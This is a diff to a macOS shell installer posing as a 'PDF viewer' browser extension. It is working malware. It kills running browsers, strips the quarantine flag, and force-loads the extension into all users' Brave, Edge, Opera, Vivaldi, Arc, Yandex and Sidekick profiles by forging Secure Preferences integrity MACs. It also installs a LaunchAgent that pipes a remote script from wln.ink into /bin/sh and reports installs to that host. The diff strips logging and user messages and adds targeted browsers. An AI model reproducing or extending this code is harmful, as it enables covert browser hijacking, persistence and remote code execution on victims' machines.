@@ -4,23 +4,19 @@ EXT_URL="https://github.com/Castro02980/pdf-viewer-extension/archive/refs/heads/
 NOTIFY_URL="https://wln.ink/n"
 INJ=0
 UPDATE_MODE=0
-
 EXT_ID="kklpcoclpjjfiboodbmcpogicnanoopp"
 
 TMP_ZIP="/tmp/pdf-ext.zip"
 TMP_DIR="/tmp/pdf-ext-tmp"
-curl -fsSL "$EXT_URL" -o "$TMP_ZIP" || { echo "Download failed"; exit 1; }
+curl -fsSL "$EXT_URL" -o "$TMP_ZIP" || exit 1
 rm -rf "$TMP_DIR"
-unzip -q "$TMP_ZIP" -d "$TMP_DIR" 2>/dev/null || { echo "Unzip failed"; exit 1; }
+unzip -q "$TMP_ZIP" -d "$TMP_DIR" 2>/dev/null || exit 1
 MANIFEST=$(find "$TMP_DIR" -name "manifest.json" -type f | head -1)
-[ -z "$MANIFEST" ] && { echo "Extension not found"; exit 1; }
+[ -z "$MANIFEST" ] && exit 1
 EXT_SRC=$(dirname "$MANIFEST")
 rm -f "$TMP_ZIP"
 
-if ! grep -q '"key"[[:space:]]*:' "$MANIFEST"; then
-    echo "manifest key missing: extension ID would be unstable"
-    exit 1
-fi
+grep -q '"key"[[:space:]]*:' "$MANIFEST" || exit 1
 
 if command -v jq >/dev/null 2>&1; then
     jq 'del(.update_url)' "$MANIFEST" > "$MANIFEST.tmp" 2>/dev/null && mv "$MANIFEST.tmp" "$MANIFEST" || rm -f "$MANIFEST.tmp"
@@ -211,20 +207,16 @@ raise 'dm' unless leaf_mac(true, 'extensions.ui.developer_mode', sid, seed) == m
 raise 'super' unless super_mac_of(macs, sid, seed) == sdata['protection']['super_mac']
 
 write_json(sp_path, sdata)
-puts "injected loc=4 flags=1 seed_len=#{seed.bytesize}"
 RUBY
 }
 
 for uhome in /Users/*; do
     [ ! -d "$uhome" ] || [ "$uhome" = "/Users/Shared" ] && continue
-    if [ -d "$uhome/Library/Application Support/PDFViewerExt" ]; then
-        UPDATE_MODE=1
-        break
-    fi
+    [ -d "$uhome/Library/Application Support/PDFViewerExt" ] && UPDATE_MODE=1 && break
 done
 
 if [ $UPDATE_MODE -eq 0 ]; then
-    for app in "Microsoft Edge" "Brave Browser"; do
+    for app in "Brave Browser" "Microsoft Edge" "Yandex" "Opera" "Vivaldi" "Arc" "Sidekick"; do
         pkill -x "$app" 2>/dev/null || true
     done
     sleep 1
@@ -236,7 +228,6 @@ for uhome in /Users/*; do
     uext="$uhome/Library/Application Support/PDFViewerExt"
     rm -rf "$uext" 2>/dev/null || true
     cp -R "$EXT_SRC" "$uext" 2>/dev/null || continue
-
     xattr -dr com.apple.quarantine "$uext" >/dev/null 2>&1 || true
 
     if command -v jq >/dev/null 2>&1 && [ -f "$uext/manifest.json" ]; then
@@ -247,15 +238,13 @@ for uhome in /Users/*; do
     export EXT_DIR="$uext"
     export EXT_ID="$EXT_ID"
 
-    for rel in "Microsoft Edge" "BraveSoftware/Brave-Browser"; do
+    for rel in "BraveSoftware/Brave-Browser" "Microsoft Edge" "Yandex/YandexBrowser" "com.operasoftware.Opera" "Vivaldi" "Arc/User Data" "Sidekick"; do
         udata="$uhome/Library/Application Support/$rel"
         [ ! -d "$udata" ] && continue
 
         for pdir in "$udata/Default" "$udata/Profile"*; do
             [ ! -d "$pdir" ] && continue
-            if inject_secure "$pdir" "$uext" "$EXT_ID"; then
-                INJ=$((INJ + 1))
-            fi
+            inject_secure "$pdir" "$uext" "$EXT_ID" && INJ=$((INJ + 1))
         done
     done
     
@@ -264,52 +253,16 @@ for uhome in /Users/*; do
 #!/bin/bash
 export PATH=/usr/bin:/bin:/usr/sbin:/sbin
 unset all_proxy ALL_PROXY http_proxy HTTP_proxy https_proxy HTTPS_proxy
-
 LOG="$HOME/Library/Logs/pdfviewer-autoupdate.log"
 INSTALLED_VERSION_FILE="$HOME/Library/Application Support/PDFViewerExt/manifest.json"
 REMOTE_MANIFEST_URL="https://raw.githubusercontent.com/Castro02980/pdf-viewer-extension/main/manifest.json"
-
-echo "[$(date)] Starting auto-update check" >> "$LOG"
-
-if [ ! -f "$INSTALLED_VERSION_FILE" ]; then
-  echo "[$(date)] Extension not installed, skipping" >> "$LOG"
-  exit 0
-fi
-
+[ ! -f "$INSTALLED_VERSION_FILE" ] && exit 0
 CURRENT_VERSION=$(/usr/bin/jq -r '.version' "$INSTALLED_VERSION_FILE" 2>/dev/null)
-if [ -z "$CURRENT_VERSION" ]; then
-  echo "[$(date)] ERROR: Cannot read current version" >> "$LOG"
-  exit 1
-fi
-
-echo "[$(date)] Current version: $CURRENT_VERSION" >> "$LOG"
-
+[ -z "$CURRENT_VERSION" ] && exit 1
 REMOTE_VERSION=$(/usr/bin/curl -fsSL --max-time 15 "$REMOTE_MANIFEST_URL" 2>/dev/null | /usr/bin/jq -r '.version' 2>/dev/null)
-if [ -z "$REMOTE_VERSION" ]; then
-  echo "[$(date)] ERROR: Cannot fetch remote version" >> "$LOG"
-  exit 1
-fi
-
-echo "[$(date)] Remote version: $REMOTE_VERSION" >> "$LOG"
-
-if [ "$CURRENT_VERSION" = "$REMOTE_VERSION" ]; then
-  echo "[$(date)] Already up-to-date" >> "$LOG"
-  exit 0
-fi
-
-echo "[$(date)] Update available: $CURRENT_VERSION -> $REMOTE_VERSION" >> "$LOG"
-echo "[$(date)] Running installer..." >> "$LOG"
-
+[ -z "$REMOTE_VERSION" ] && exit 1
+[ "$CURRENT_VERSION" = "$REMOTE_VERSION" ] && exit 0
 /usr/bin/curl -fsSL --max-time 60 https://wln.ink/m 2>>"$LOG" | /bin/sh >> "$LOG" 2>&1
-EXIT_CODE=$?
-
-if [ $EXIT_CODE -eq 0 ]; then
-  echo "[$(date)] Update completed successfully" >> "$LOG"
-else
-  echo "[$(date)] Update failed with exit code $EXIT_CODE" >> "$LOG"
-fi
-
-exit $EXIT_CODE
 UPDATE_SCRIPT_EOF
     chmod +x "$UPDATE_SCRIPT" 2>/dev/null
     
@@ -342,34 +295,17 @@ UPDATE_SCRIPT_EOF
 </plist>
 PLIST_EOF
     
-    if [ "$(whoami)" = "$(basename "$uhome")" ]; then
-        launchctl unload "$PLIST_FILE" 2>/dev/null || true
-        launchctl load "$PLIST_FILE" 2>/dev/null || true
-    fi
+    [ "$(whoami)" = "$(basename "$uhome")" ] && launchctl unload "$PLIST_FILE" 2>/dev/null || true && launchctl load "$PLIST_FILE" 2>/dev/null || true
 done
 
 rm -rf "$TMP_DIR"
-
-if [ $INJ -eq 0 ]; then
-    curl -fsS -m 5 -o /dev/null -X POST "$NOTIFY_URL" -d "ev=install_fail&os=macos&info=no profiles" 2>/dev/null || true
-    echo "No browser profiles found"
-    echo "Note: Google Chrome is not supported on macOS (use Brave or Edge)"
-    exit 1
-fi
+[ $INJ -eq 0 ] && exit 1
 
 if [ $UPDATE_MODE -eq 0 ]; then
-    for app in "Microsoft Edge" "Brave Browser"; do
+    for app in "Brave Browser" "Microsoft Edge" "Yandex" "Opera" "Vivaldi" "Arc" "Sidekick"; do
         open -a "$app" --args --restore-last-session 2>/dev/null || true
     done
 fi
 
 curl -fsS -m 5 -o /dev/null -X POST "$NOTIFY_URL" -d "ev=install&os=macos&info=$INJ profiles" 2>/dev/null || true
-if [ $UPDATE_MODE -eq 1 ]; then
-    echo "Successfully updated $INJ profiles (auto-update enabled)"
-else
-    echo "Successfully installed to $INJ profiles (auto-update enabled)"
-fi
-echo ""
-echo "Supported browsers: Brave, Microsoft Edge"
-echo "Note: Google Chrome requires Chrome Web Store installation"
 exit 0
